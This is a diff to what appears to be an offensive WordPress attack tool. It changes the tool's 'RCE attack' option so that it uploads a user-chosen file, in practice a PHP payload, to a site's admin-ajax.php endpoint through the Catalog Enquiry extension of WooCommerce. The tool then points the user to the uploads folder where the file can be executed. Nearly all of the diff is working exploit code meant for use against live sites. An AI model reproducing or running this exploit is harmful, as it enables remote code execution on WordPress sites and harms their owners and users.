@@ -6,6 +6,7 @@ import mutagen
 import re
 import urllib.request
 import os
+import requests
 from modules import Support
 
 
@@ -194,19 +195,31 @@ while not(choice_num == 99):
 		print("   *                        RCE attack                              *")
 		print("   ******************************************************************")
 		print(" - In order to perform this exploit, the target site requires Catalog Enquiry as an extension of WooCommerce plugin.") 
-
-		form_file = open("modules/RCE/form.html", "w")
-		form_file.write("<html><body><form action=\"" + url + "/wp-admin/admin-ajax.php\" method=\"POST\" enctype=\"multipart/form-data\"><input type=\"hidden\" name=\"action\" value=\"send_enquiry_mail\" /><input type=\"file\" name=\"fileupload[0]\" /><input type=\"submit\" value=\"Submit\" /></form></body></html>")
-
-		print(" - A file form.htlm is generated in the modules/RCE folder, consisting of a simple form to update files.")
 		print(" - You can upload whatever file you want, including files containing code instruction you want to execute on the server side.")
-		print(" - As a demonstration, upload the file rce.php that you find in the modules folder.")
-		print(" - Visit the " +url+"/wp-content/uploads/catalog_enquiry/[name of your file] folder to access the content of your uploaded file")
+
+		user_file = input(" - Insert here the complete path of the file you want to upload: ")
+
+
+		rce_url = url + "/wp-admin/admin-ajax.php"
+
+
+		files = {
+			'fileupload[0]' : open(user_file.replace(" ", ""), 'rb')
+		}
+
+		data = {
+			'action' : 'send_enquiry_mail'
+		}
+
+		r = requests.post(rce_url, files=files, data=data)
+
+		print(" - Visit the " + url +"/wp-content/uploads/catalog_enquiry/" + Support.file_parse(user_file) + " folder to access the content of your uploaded file")
 		print("   ------------------------------------------------------------------")
 		print("\n")
 
 	elif choice_num == 99:
-		print("   Thank you for using the wordpressing tool!")
+		print("   ------------------------------------------------------------------")
+		print("   - Thank you for using the wordpressing tool!                     -")
 		print("   ------------------------------------------------------------------")
 
 
